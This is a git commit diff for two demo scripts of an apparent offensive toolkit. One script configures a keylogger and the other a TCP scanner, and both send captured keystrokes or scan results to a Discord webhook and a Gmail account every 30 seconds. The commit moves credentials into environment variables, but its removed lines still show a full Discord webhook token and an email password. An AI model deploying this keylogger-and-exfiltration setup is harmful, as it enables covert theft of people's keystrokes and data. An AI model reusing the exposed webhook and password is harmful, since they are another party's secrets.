6ead29afdb11d7bf1b41ebc9f666a465c41b5097
EONRaider <livewire_voodoo@protonmail.com>
2021-10-13 10:59:11 -0300

    Remove hardcoded credentials

--- demo_files/keylogger_demo.py
+++ demo_files/keylogger_demo.py
@@ -3,16 +3,25 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import os
 import pathlib
 
 from src.modules.exfiltration import Discord, Email, File, Screen
 from src.modules.exploitation import KeyLogger
 
+import dotenv
+
+
+dotenv.load_dotenv()
 
 '''This is a simple demonstration of how the keylogger could be set up 
 on a Linux system to exfiltrate information to a text file, a Discord 
 server and an email address (as well as to the screen for debugging 
-purposes). All credentials are invalid and serve as mere examples.'''
+purposes).
+The environment variable 'WEBHOOK_URL' must be passed if the Discord 
+exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
+'EMAIL_PASSWORD' for the Email exfiltrator.
+'''
 
 # Setting up the Keylogger to exfiltrate data every 30 seconds
 keylogger = KeyLogger(exfil_time=30)
@@ -26,16 +35,14 @@ File(module=keylogger,
 
 # Captured data will be sent to a Discord server through a Webhook URL
 Discord(module=keylogger,
-        webhook_url="https://discord.com/api/webhooks/896081552151306340/"
-                    "ikFf8J24Yk1VWjMBMP_tjrcNHFuaIZWp0la8zoeZn1QAaQa93x7e"
-                    "S24cFreKbfKyo49e")
+        webhook_url=os.getenv("WEBHOOK_URL"))
 
 # An email will be sent through a secure connection using SMTP
 Email(module=keylogger,
       smtp_host="smtp.gmail.com",
       smtp_port=465,
-      email="bca.backdoor@gmail.com",
-      password="Ng!a94fGBtfij4$btbmf@q9&p6gk9@&qY63qPdh!")
+      email=os.getenv("EMAIL_USERNAME"),
+      password=os.getenv("EMAIL_PASSWORD"))
 
 # Done. Begin monitoring of keyboard events and exfiltration of data.
 keylogger.execute()
--- demo_files/scanner_demo.py
+++ demo_files/scanner_demo.py
@@ -3,18 +3,26 @@
 
 __author__ = "EONRaider @ keybase.io/eonraider"
 
+import os
 import pathlib
 
 from src.modules.exfiltration import Discord, Email, File, Screen
 from src.modules.exploitation import TCPScanner
+
+import dotenv
 
 
 '''This is a simple demonstration of how the Scanner module could be 
 set up on a Linux system to perform a Full-connect TCP scan on an 
 arbitrary number of internal/external hosts and exfiltrate the results 
 to a text file, a Discord server and an email address (as well as to 
-the screen for debugging purposes). All credentials are invalid and 
-serve as mere examples.'''
+the screen for debugging purposes).
+The environment variable 'WEBHOOK_URL' must be passed if the Discord 
+exfiltrator is to be used; similarly we need 'EMAIL_USERNAME' and 
+'EMAIL_PASSWORD' for the Email exfiltrator.
+'''
+
+dotenv.load_dotenv()
 
 # Set up the TCPScanner to send probes to internal and external targets
 scanner = TCPScanner(targets=("localhost", "testphp.vulnweb.com"),
@@ -30,16 +38,14 @@ File(module=scanner,
 
 # Scan results will be sent to a Discord server through a Webhook URL
 Discord(module=scanner,
-        webhook_url="https://discord.com/api/webhooks/896081552151306340/"
-                    "ikFf8J24Yk1VWjMBMP_tjrcNHFuaIZWp0la8zoeZn1QAaQa93x7e"
-                    "S24cFreKbfKyo49e")
+        webhook_url=os.getenv("WEBHOOK_URL"))
 
 # An email will be sent through a secure connection using SMTP
 Email(module=scanner,
       smtp_host="smtp.gmail.com",
       smtp_port=465,
-      email="bca.backdoor@gmail.com",
-      password="Ng!a94fGBtfij4$btbmf@q9&p6gk9@&qY63qPdh!")
+      email=os.getenv("EMAIL_USERNAME"),
+      password=os.getenv("EMAIL_PASSWORD"))
 
 # Done. Perform all scans and proceed to exfiltration of data.
 scanner.execute()
